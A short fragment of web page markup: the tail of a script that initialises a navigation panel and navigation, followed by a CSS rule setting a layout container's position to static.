ql.navPanel.init(); ql.navigation.init(); });</script> <style>.mdl-layout__container { position: static }</style>